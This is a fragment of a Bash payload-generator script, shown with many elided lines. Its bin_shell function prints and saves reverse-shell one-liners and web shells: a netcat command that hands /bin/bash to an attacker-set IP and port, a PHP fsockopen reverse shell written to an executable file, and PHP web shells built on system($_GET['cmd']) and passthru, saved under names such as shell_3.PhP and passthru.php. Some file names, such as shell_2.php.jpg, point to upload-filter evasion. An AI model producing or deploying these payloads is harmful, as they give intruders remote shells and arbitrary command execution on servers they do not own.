...
function bin_shell(){
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Bash [1] \n \n "
	...
	echo -e " $GREEN This is the script save by file name $file "
	chmod +x $file
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Bash encode  [1] \n \n "
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Python [1] \n \n "
	...
	echo -e " $GREEN This is the script save by file name $file1 "
	chmod +x $file1
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Python Encode [1] \n \n "
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Perl [1] \n \n "
	...
	echo -e "$GREEN This is the script save by file name $file2 "
	chmod +x $file2
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "$GREEN This is the script Perl encode \n"
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script Ruby [1] \n \n "
	...
	echo -e " $GREEN This is the script save by file name $file3 "
	chmod +x $file3
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "$GREEN This is the script encode Ruby \n"
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script netcat [1] \n "
	echo  "nc $MY_IP $MY_PORT -e \"/bin/bash\" " # This is Netcat 1
	echo -e "\n \n ";
	echo -e " $GREEN This is the script netcat [2] \n "
	...
	echo -e " $GREEN This is the script save by file name  [1] $file4 "
	chmod +x $file4
	echo -e "\n \n ";
	...
	echo -e " $GREEN This is script Create by Defualt [2] Netcat2.sh \n "
	chmod +x Netcat2.sh
	...
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script php [1] \n " 
	echo  "php -r '$sock=fsockopen($MY_IP,$MY_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' "
	echo -e "\n "
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is script php [2] \n "
	echo  " <?php echo system($_GET['cmd']); ?> "
	echo -e "\n "
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e  " $GREEN This is the script php [3] \n "
	...
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "#!/usr/bin/env php"  > $file5
	echo -e " $GREEN This is the script save by file name [1] $file5 "
	echo  "php -r '$sock=fsockopen($MY_IP,$MY_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' " >> $file5
	chmod +x $file5

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script save by file name [2] (shell_1.php) \n"
	echo  " <?php echo system($_GET['cmd']); ?> " > shell_1.php
	chmod +x shell_1.php

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script save by file name [3] (shell_2.php.jpg) \n"
	...
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script save by file name [4] (shell_3.PhP) \n"
	echo  " <?php echo system($_GET['cmd']); ?> " > shell_3.PhP
	chmod +x shell_3.PhP

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script save by file name [5] (passthru.php) \n"
	echo 	"<?php passthru($_GET['cmd']); ?>" > passthru.php
	chmod +x passthru.php

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script save by file name [6] (passthru_2.php.jpg) \n"
	...
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " $GREEN This is the script [7] passthru_3.PhP \n "
